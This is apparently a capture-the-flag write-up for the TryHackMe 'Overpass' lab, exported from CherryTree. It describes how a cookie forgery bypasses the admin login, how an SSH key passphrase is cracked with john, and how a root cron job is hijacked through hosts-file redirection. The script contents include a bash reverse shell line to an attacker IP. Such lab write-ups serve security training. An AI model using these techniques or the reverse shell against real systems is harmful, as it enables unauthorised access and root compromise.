<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>overpass</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>overpass</h1><br/><p></p><p><strong><h1>THM Overpass</h1></strong></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p></p><p><strong>Rustscan</strong></p><p><img src="images/25-1.png" alt="images/25-1.png" /></p><p></p><p><strong>Nmap</strong></p><p><img src="images/25-2.png" alt="images/25-2.png" /></p><p></p><p></p><p><strong>Directory Enumeration</strong></p><p></p><p><img src="images/25-3.png" alt="images/25-3.png" /></p><p></p><p><img src="images/25-4.png" alt="images/25-4.png" /></p><p></p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p><img src="images/25-5.png" alt="images/25-5.png" />\</p><p>Check the highlighted part of <strong>login.js</strong>. Lets try to replicate that in a custom cookie</p><p><img src="images/25-6.png" alt="images/25-6.png" /></p><p>We create a cookie and load the page.</p><p>And set <strong>SessionToken</strong> to value of <strong>StatusOrCookie</strong> and put path as <strong>/admin</strong></p><p><img src="images/25-7.png" alt="images/25-7.png" /></p><p></p><p></p><p><img src="images/25-8.png" alt="images/25-8.png" /></p><p></p><p></p><p>We copy the ssh private id into the <strong>ssh_hash</strong> file. Then convert it to john format as folllows and then crack it.</p><p></p><p><img src="images/25-9.png" alt="images/25-9.png" /></p><p></p><p><strong>We use the found paraphrase to login into ssh using the id_key and paraphrase found</strong></p><p></p><p><img src="images/25-10.png" alt="images/25-10.png" /></p><p></p><p>We get 2 documents in the user directory as follows.</p><p><img src="images/25-11.png" alt="images/25-11.png" /></p><p></p><p></p><p>As system password is stored in overpass. We find it and run it as follows</p><p>Choose Option 4 to dump the passwords. We get <strong>james</strong> password</p><p><img src="images/25-12.png" alt="images/25-12.png" /></p><p></p><p></p><p><strong><h2>Privilege Escalation</h2></strong></p><p></p><p>We checked sudo, <strong>james</strong> had no sudo access.</p><p>Next we focus on <strong>crontabs</strong></p><p></p><p><img src="images/25-13.png" alt="images/25-13.png" /></p><p></p><p>Every minute root visits the webiste overpass.thm</p><p>We edit the hosts files for overpass.thm to point our local websever.</p><p></p><p></p><p><img src="images/25-14.png" alt="images/25-14.png" /></p><p></p><p><strong>In Kali Machine</strong></p><p>We create a revershell and host it as following.</p><p></p><p><img src="images/25-15.png" alt="images/25-15.png" /></p><p></p><p>Contents in <strong>buildscript.sh</strong></p><p><strong>bash -i &gt;&amp; /dev/tcp/10.11.72.31/8888 0&gt;&amp;1</strong></p><p></p><p></p><p><img src="images/25-16.png" alt="images/25-16.png" /></p><p></p><p></p><p>Within a minute, the crotab will be called and we will get a root shell.</p><p></p><p><img src="images/25-17.png" alt="images/25-17.png" /></p><p></p><p>Thanks!!</p></div>
</body>
</html>
